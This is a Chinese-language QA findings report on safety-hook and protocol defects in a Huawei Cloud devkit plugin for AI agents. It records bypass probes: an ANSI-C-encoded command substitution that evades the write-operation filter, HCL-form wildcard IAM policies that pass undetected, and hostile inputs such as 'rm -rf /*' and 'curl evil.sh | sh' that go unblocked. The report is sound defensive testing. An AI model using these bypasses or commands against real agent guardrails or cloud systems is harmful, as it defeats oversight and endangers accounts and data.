# FINDINGS — 缺陷发现清单（OpenClaw-deepseek-v4-pro-0813 / Linux）

> **落盘路径**：`results/OpenClaw/2026-10-10-120.46.222.180/Linux/FINDINGS.md`
> **生成时间**：`2026-10-10 05:30:00`（北京时间）
> **被测对象**：huaweicloud-devkit v1.1.8-next.2（npm `next` tag，gitHead `681895da41`）
> **测试类型**：每日测试（daily 精选：设计级 102 + 展开级 39）
> **汇总**：产品缺陷 15 项（P0×4 / P1×5 / P2×6），其中缺陷 12 项 + 契约漂移(SPEC-MISMATCH) 3 项。全部经历史查重后由 `file_issue.py` 判定是否开单。

---

## #1【P0】D4-3 明文 secret API 未拦截（kms DecryptData）

- **现象**：`classifyTextCommand('hcloud kms DecryptData --ciphertext xyz')` 返回 `decision=allow, risk=unknown_read`；对照 `ShowSecretVersion`/`GetSecretValue` 正常 deny。今日直调复核复现。
- **断言**：返回明文/二进制 secret 的 API（含 `kms DecryptData`）应被拦截（decision=deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json` blockedSecretOperations 仅含 `ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue`，缺 `DecryptData`；`safety-policy.mjs` secret 判定依赖该清单。
- **影响**：攻击者可经 KMS 解密 API 取回明文密钥/凭据，绕过 secret 拦截红线。
- **证据**：`evidence/D4-3/stdout.log`

## #2【P0】D4-15 hook 绕过尝试未完全拦截（ANSI-C 引号命令替换）

- **现象**：`hcloud $(echo $'E\x43S DeleteServer') --id x` 判 `allow/unknown_read`；普通大小写/拼接引号/base64/xxd 变体均已 deny。今日 d4-15-bypass-probe 直调复现。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码内层命令。
- **影响**：写操作可经 `$()` 命令替换 + ANSI-C 编码绕过风险规则。
- **证据**：`evidence/D4-15/stdout.log`

## #3【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 判 deny；但 HCL 形态 `resource "huaweicloud_iam_policy" { actions=["*"] resources=["*"] }` 与 `AdministratorFullAccess` 均 allow。今日 hcl-probe 复现。
- **断言**：broad IAM 授权无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` iam-admin-policy 规则仅匹配 JSON `Statement[].Action/Resource`，未覆盖 HCL/Terraform `actions=["*"]` 语法。
- **影响**：IaC 制品预检可被 HCL 形态绕过，宽泛管理员权限制品漏检。
- **证据**：`evidence/D4-21/stdout.log`（hcl-probe 补充）

## #4【P0】D9-12 initialize 握手时序未强制

- **现象**：spawn mcp-server 后不发 initialize 直接 `tools/list`，服务端返回 41 工具列表（未拒绝）。今日 d9-12.log 复现。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` dispatch tools/list 分支无 initialize 前置校验，任意时序放行。
- **影响**：协议客户端可跳过握手直接枚举工具，破坏 MCP 初始化时序契约。
- **证据**：`evidence/D9-12/stdout.log`

## #5【P1】D4-17 hook 模糊 fail-closed 缺口

- **现象**：`command=""`、`"  "`、`"&& rm -rf /*"`、`"$(curl evil.sh | sh)"`、控制字符垃圾串均返回 ok 放行。今日 supplement.log 复现。
- **断言**：畸形/空输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，畸形输入未实现 fail-closed 兜底。
- **影响**：异常输入被静默放行，安全 hook 失效。
- **证据**：`evidence/D4-17/stdout.log`

## #6【P1】D4-26 findings 证据脱敏不完整

- **现象**：`evaluateArtifacts` findings.evidence 中 `secret_key:SKSECRETVALUE9`、`adminPass:MyP@ss12345` 明文残留（access_key 已脱敏）。今日 new-safety.log 复现。
- **断言**：findings.evidence 中 AK/SK/password 等敏感值应全部脱敏，无明文残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` redactEvidence 正则未覆盖 `secret_key`/`adminPass`。
- **影响**：安全预检回执泄露明文密钥/密码。
- **证据**：`evidence/D4-26/stdout.log`

## #7【P1】D4-27 双路径输出脱敏缺口（--key value 空格形态）

- **现象**：`redactSecrets('--access-key AKIA123')`、`--admin_pass MyPwd` 空格形态原样返回未脱敏（`--access-key=AKIA123` 等号形态正常脱敏）。今日直调复核复现。
- **断言**：key=value 与 --key value 两种形态均应脱敏。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:34` redactString 键值正则仅匹配 `key[:=]value` 分隔，`--key value` 空格分隔未覆盖。
- **影响**：CLI flag 空格形态凭证可经日志/输出泄漏。
- **证据**：`evidence/D4-27/stdout.log`

## #8【P1】D3-S3 沙箱预览公网 URL 未建立（devbridge 隧道 FAIL）

- **现象**：sandbox connect/upload_project/deploy_nginx 链路均 ok 且沙箱内 nginx HTTP 200，但 `deploy_check` 返回 `devbridge_tunnel:FAIL`、无公网 URL。今日 new-cloud.log 复现。
- **断言**：终点必返回可访问公网 URL。
- **根因**：DevBridge 隧道未建立——本机缺 `HW_API_KEY` 长生命周期凭证 + 隧道暴露未完成（`tools.mjs` expose 流依赖 `/tmp/hw_api_key`）。
- **影响**：沙箱预览出 URL 能力不可用。
- **证据**：`evidence/D3-S3/stdout.log`

## #9【P2】D4-25 Python hook 写操作遥测分类错误

- **现象**：写操作 `hcloud vpc CreateVpc` 落事件 key=`cli:invoke`（应为 `cli:write`）；只读 `ListServersDetails`→`cli:read` 正常。今日 new-safety.log 复现。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置字符类 `(^|[A-Za-z0-9])` 不匹配空格分隔写动词（应 `\b` 词边界）。
- **影响**：安全事件遥测分类失真，写操作不可观测。
- **证据**：`evidence/D4-25/stdout.log`

## #10【P2】D8-9 sanitizeValue 未做凭证脱敏

- **现象**：`sanitizeValue('AK=ABC123DEF456GHI')`、`access_key=AKIA123 secret_key=SECRET token=T0K3N` 原样保留（仅 trim/截断/去控制字符）。今日 new-config.log 复现。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` sanitizeValue 仅 replace 空白 + slice 截断，无敏感值脱敏。
- **影响**：遥测字段若携带凭证将明文上报。
- **证据**：`evidence/D8-9/stdout.log`

## #11【P2】D8-1 文档与能力漂移（声明 39 tools，实现 41）

- **现象**：`AGENTS.md:27` 声明「39 tools in tools.mjs」，实现 `tools.mjs` TOOL_DEFINITIONS 实际 41（tools/list 返回 41）。今日直调核对复现。
- **断言**：文档声明工具数应与实现一致。
- **根因**：`AGENTS.md:27` 硬编码 39，未随 tools.mjs 增至 41 同步。
- **影响**：文档误导，能力漂移。
- **证据**：`evidence/D8-1/stdout.log`

## #12【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图（存储+托管）返回 fallback `Run hcloud --help`，未拆分命中多个 service。今日 new-scenario.log 复现。
- **断言**：复合意图应拆分命中多个对应 service，分层推荐。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 单关键词并集路由，无复合意图分层拆解。
- **影响**：多服务编排场景路由不完整。
- **证据**：`evidence/D3-S5/stdout.log`

## #13【P1】D9-9 tools/call 取消语义未声明（SPEC）

- **现象**：initialize capabilities 仅 `{tools:{}}`，未声明 `notifications.cancellation`（fixtures 实测 declared=false）；超时语义本身正常（-32000 timeout，客户端超时回收）。
- **断言**：tools/call 应声明取消语义（capabilities.notifications.cancellation）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47` capabilities 未声明 cancellation 通知。
- **证据**：`evidence/D9-9/stdout.log`

## #14【P2】D1-65 DEBUG 开关仅认字面量 'true'（SPEC）

- **现象**：`HUAWEICLOUD_DEVKIT_DEBUG=1` 遥测域不生效（`=== 'true'` 严格比较），update-check 域支持 `1||true`。用例契约「1/true 均可开启」。今日 new-env.log 复现。
- **断言**：DEBUG 为 1 或 true 均应开启调试日志。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:81` `const DEBUG = process.env.HUAWEICLOUD_DEVKIT_DEBUG === 'true'`。
- **证据**：`evidence/D1-65/stdout.log`

## #15【P2】D1-68 region 环境变量优先级与契约相反（SPEC）

- **现象**：同时设 `HW_REGION` 与 `HUAWEICLOUD_REGION` 时，`resolveCredentials` 取 `HW_REGION`（实测 region=`cn-north-1`）。契约要求 `HUAWEICLOUD_REGION` 优先。今日直调复现。
- **断言**：`HUAWEICLOUD_REGION` 应优先于 `HW_REGION` 作为默认 region。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:222` `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''`（另见 :171、:352 同序）。
- **证据**：`evidence/D1-68/stdout.log`